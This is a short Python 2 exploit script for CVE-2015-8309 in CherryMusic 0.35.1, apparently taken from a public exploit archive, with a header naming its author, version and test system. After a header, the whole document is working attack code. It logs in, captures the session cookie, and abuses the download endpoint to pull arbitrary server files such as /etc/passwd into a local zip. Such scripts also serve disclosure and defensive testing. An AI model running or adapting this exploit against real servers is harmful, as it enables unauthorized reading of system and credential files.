# Date: 11-09-2016
# Exploit Author: feedersec
# Contact: feedersec@gmail.com
# Vendor Homepage: http://www.fomori.org/cherrymusic/index.html
# Software Link: http://www.fomori.org/cherrymusic/versions/cherrymusic-0.35.1.tar.gz
# Version: 0.35.1
# Tested on: ubuntu 14.04 LTS
# CVE : CVE-2015-8309
 
import urllib2, cookielib, urllib
 
#set parameters here
username = &#039;admin&#039;
password = &#039;Password01&#039;
baseUrl = &#039;http://localhost:8080/&#039;
targetFile = &#039;/etc/passwd&#039;
downloadFileName = &#039;result.zip&#039;
####
 
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) 
params = urllib.urlencode({&#039;username&#039;: username, &#039;password&#039;: password, &#039;login&#039;: &#039;login&#039;})
req = urllib2.Request(baseUrl, params)
response = opener.open(req) 
for c in cj:
  if c.name == "session_id":
    session_id = c.value
 
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders.append((&#039;Cookie&#039;, &#039;session_id=&#039; + session_id))
params = urllib.urlencode({&#039;value&#039;: &#039;["&#039; + targetFile + &#039;"]&#039;})
request = urllib2.Request(baseUrl + "download", params)
response = opener.open(request).read()
with open(downloadFileName, &#039;wb&#039;) as zipFile:
    zipFile.write(response)

